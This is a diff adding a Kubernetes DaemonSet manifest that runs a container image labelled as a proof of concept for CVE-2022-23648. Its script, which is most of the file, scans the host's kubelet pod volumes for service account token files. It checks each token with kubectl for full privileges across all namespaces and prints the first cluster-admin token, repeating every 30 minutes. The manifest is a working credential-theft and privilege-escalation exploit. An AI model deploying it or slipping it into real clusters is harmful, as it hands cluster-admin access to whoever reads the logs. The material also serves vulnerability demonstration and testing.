@@ -1,0 +1,41 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: poctest
+  namespace: default
+  labels:
+    app: poctest
+spec:
+  selector:
+    matchLabels:
+      app: poctest
+  template:
+    metadata:
+      labels:
+        app: poctest
+    spec:
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        operator: Exists
+        effect: NoSchedule
+      containers:
+      - name: poctest
+        image: ghcr.io/bgeesaman/cve-2022-23648-poc:v1 
+        command: ["bash", "-c"]
+        args:
+          - |
+            # Search /var/lib/kubelet/pods/*/volumes/* for files named 'token'
+            # which are the Kubernetes SA tokens
+            # Loop through each one found
+            for i in $(find /var/lib/kubelet/pods/*/volumes/* -name 'token' -type f); do
+              # If it's got all privileges in all namespaces
+              if [ "$(kubectl --token=`cat $i` auth can-i '*' '*' -A | grep yes)" == 'yes' ]; then
+                TOKEN="$(cat $i)";
+                # Send it to standard out
+                echo $TOKEN;
+                # And stop processing
+                break;
+              fi;
+            done
+            # Since these tokens expire, wait 30m, crash, and repeat
+            sleep 1800;
